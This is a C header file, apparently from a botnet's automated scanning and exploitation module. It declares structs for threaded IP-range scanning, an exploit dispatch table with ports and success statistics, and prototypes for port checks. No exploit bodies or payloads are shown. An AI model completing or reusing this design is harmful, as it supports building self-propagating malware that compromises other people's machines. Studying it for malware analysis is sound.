/*
enum {
	HTTP_TYPE_UNKNOWN,				// Unknown httpd respond... 
	HTTP_TYPE_IIS_60,				// IIS 6.0 httpd running...
	HTTP_TYPE_IIS_55,				// IIS 5.5 httpd running...
	HTTP_TYPE_IIS_50,				// IIS 5.0 httpd running...
	HTTP_TYPE_IIS_40,				// IIS 4.0 httpd running...
	HTTP_TYPE_APACHE_1X_UNIX,		// Apache 1.x on (Unix) ...
	HTTP_TYPE_APACHE_1X_WIN32,		// Apache 1.x on (Win32)...
	HTTP_TYPE_APACHE_2X_UNIX,		// Apache 2.x on (Unix) ...
	HTTP_TYPE_APACHE_2X_WIN32,		// Apache 2.x on (Win32)...
	HTTP_OPTION_UNKNOWN,			// Unknown option responded...
	HTTP_OPTION_WEBDAV				// Webdav option responded ...
};
*/

typedef struct ADVSCANTHREAD
{
	SESSION Session;
	char ip[MAXIP];
//	char chan[MAXCHANLEN];
//	char msgchan[MAXCHANLEN];
//	SOCKET sock;
	unsigned short Port;
	DWORD Delay;
	DWORD Minutes;
//	unsigned int threadnum;
//	unsigned int cthreadnum;
//	unsigned int cthreadid;
	DWORD MaxThreads;
	short Exploit;
	bool Random;
/////////////////////////////////////////////////////
	int sThreadnum;
	int sThreadID;
	bool sGotit;
/////////////////////////////////////////////////////
	DWORD CurrentIP;

	bool xEnabled;
	DWORD xDelay;

//	BOOL notice;
//	BOOL silent;
//	BOOL random;
//	BOOL gotinfo;
//	BOOL cgotinfo;

	bool Active;

	bool Gotit;
	int Threadnum;

} ADVSCANTHREAD;

//typedef struct ADVINFO 
//{
//	unsigned long ip;
//	bool info;
//
//} ADVINFO;

typedef struct EXINFO 
{
	SESSION Session;
	SOCKET sock;
	char ip[MAXIP];
	char Command[16];
	char Name[32];
	unsigned short Port;

} EXINFO;

typedef bool (*EXP)(EXINFO exinfo);

typedef struct EXPLOITS
{
	char Command[16];
	char Name[32];
	unsigned short Port;
	EXP exp;
	DWORD Stats;
//	bool tftp;
//	bool http;

} EXPLOITS;
/*
typedef struct recvhdr 
{
	struct iphdr ip;
	struct tcphdr2 tcp;
	unsigned char junk_data[65535];

} RECVHEADER;
*/
void XAdvListExploitStats(SESSION* Session);
void XAdvGetCurrentIP(SESSION* Session, int ThreadNum);
//void CheckServers(ADVSCAN scan);
unsigned long XAdvGetNextIP(CRITICAL_SECTION cs, DWORD* CurrentIP);
unsigned long XAdvGetNextIPRandom(CRITICAL_SECTION cs, char *ScanMask);
bool XAdvCheckPort(unsigned long ip, unsigned short Port, DWORD Delay);
//BOOL SynPortOpen(unsigned long src_ip, unsigned long dest_ip, unsigned short port, unsigned int delay);
//int AdvHttpdScanner(EXINFO exinfo);
DWORD WINAPI XAdvPortScannerThread(LPVOID lpParam);
DWORD WINAPI XAdvScannerThread(LPVOID lpParam);
